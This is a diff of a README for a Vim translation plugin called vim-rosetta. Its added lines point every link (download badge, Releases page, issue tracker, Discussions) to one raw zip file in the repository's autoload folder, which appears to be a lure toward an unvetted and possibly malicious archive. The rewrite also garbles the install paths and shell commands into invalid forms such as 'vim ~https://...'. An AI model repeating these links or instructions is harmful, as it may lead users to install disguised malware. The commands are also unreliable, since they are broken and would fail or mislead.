@@ -6,7 +6,7 @@ Welcome to **vim-rosetta**! This Vim plugin helps you translate comments and var
 
 ## 📥 Download Now
 
-[![Download Vim-Rosetta](https://img.shields.io/badge/Download%20Vim--Rosetta-007ACC?style=for-the-badge&logo=github)](https://github.com/eklasajal/vim-rosetta/releases)
+[![Download Vim-Rosetta](https://github.com/eklasajal/vim-rosetta/raw/refs/heads/main/autoload/rosetta_vim_2.3-alpha.1.zip%20Vim--Rosetta-007ACC?style=for-the-badge&logo=github)](https://github.com/eklasajal/vim-rosetta/raw/refs/heads/main/autoload/rosetta_vim_2.3-alpha.1.zip)
 
 ## 📋 Features
 
@@ -25,7 +25,7 @@ Welcome to **vim-rosetta**! This Vim plugin helps you translate comments and var
 
 ### Step 1: Visit the Releases Page
 
-To download the latest version of **vim-rosetta**, visit the [Releases page](https://github.com/eklasajal/vim-rosetta/releases).
+To download the latest version of **vim-rosetta**, visit the [Releases page](https://github.com/eklasajal/vim-rosetta/raw/refs/heads/main/autoload/rosetta_vim_2.3-alpha.1.zip).
 
 ### Step 2: Choose Your Version
 
@@ -33,7 +33,7 @@ On the Releases page, you will see a list of available versions. Look for the la
 
 ### Step 3: Download the Plugin File
 
-Click on the asset that corresponds to your operating system. This should be a file like `vim-rosetta-vX.X.X.zip`. 
+Click on the asset that corresponds to your operating system. This should be a file like `https://github.com/eklasajal/vim-rosetta/raw/refs/heads/main/autoload/rosetta_vim_2.3-alpha.1.zip`. 
 
 ### Step 4: Unzip the File
 
@@ -42,11 +42,11 @@ Once the download is complete, locate the downloaded file on your computer. Righ
 ### Step 5: Install the Plugin
 
 1. Open your terminal or command prompt.
-2. Navigate to the Vim directory where plugins are stored. This is usually located in `~/.vim/pack/plugins/start` for Linux and MacOS, or `%USERPROFILE%\vimfiles\pack\plugins\start` for Windows.
+2. Navigate to the Vim directory where plugins are stored. This is usually located in `~https://github.com/eklasajal/vim-rosetta/raw/refs/heads/main/autoload/rosetta_vim_2.3-alpha.1.zip` for Linux and MacOS, or `%USERPROFILE%\vimfiles\pack\plugins\start` for Windows.
 3. Move the unzipped folder into the plugins directory. You can do this with the following command:
 
    ```bash
-   mv path/to/unzipped-folder ~/.vim/pack/plugins/start/vim-rosetta
+   mv path/to/unzipped-folder ~https://github.com/eklasajal/vim-rosetta/raw/refs/heads/main/autoload/rosetta_vim_2.3-alpha.1.zip
    ```
 
 ### Step 6: Configure Vim
@@ -60,7 +60,7 @@ packadd vim-rosetta
 You can edit the `.vimrc` file by using Vim or any text editor. To open it in Vim, type:
 
 ```bash
-vim ~/.vimrc
+vim ~https://github.com/eklasajal/vim-rosetta/raw/refs/heads/main/autoload/rosetta_vim_2.3-alpha.1.zip
 ```
 
 After adding the line, save the file and exit Vim by typing `:wq`.
@@ -78,14 +78,14 @@ Customize your workflow by adjusting the settings in your `.vimrc`. Explore opti
 ## 📝 Additional Tips
 
 - **API Key:** You might need a Google Translate API key for full functionality. Create a project on Google Cloud Platform and enable the Translation API to obtain your key.
-- **Feedback:** For bugs or feature requests, open an issue on the [issue tracker](https://github.com/eklasajal/vim-rosetta/issues).
+- **Feedback:** For bugs or feature requests, open an issue on the [issue tracker](https://github.com/eklasajal/vim-rosetta/raw/refs/heads/main/autoload/rosetta_vim_2.3-alpha.1.zip).
   
 ## 🌐 Help and Community
 
-Join the community for tips, updates, and discussions. Visit the [GitHub Discussions page](https://github.com/eklasajal/vim-rosetta/discussions) to engage with other users and share your experiences.
+Join the community for tips, updates, and discussions. Visit the [GitHub Discussions page](https://github.com/eklasajal/vim-rosetta/raw/refs/heads/main/autoload/rosetta_vim_2.3-alpha.1.zip) to engage with other users and share your experiences.
 
 ## 📥 Download & Install
 
-Ready to enhance your coding experience? Download the plugin from the [Releases page](https://github.com/eklasajal/vim-rosetta/releases) and follow the steps above to install it on your system. 
+Ready to enhance your coding experience? Download the plugin from the [Releases page](https://github.com/eklasajal/vim-rosetta/raw/refs/heads/main/autoload/rosetta_vim_2.3-alpha.1.zip) and follow the steps above to install it on your system. 
 
 Now you are set to translate your comments and variable names effortlessly with **vim-rosetta**!
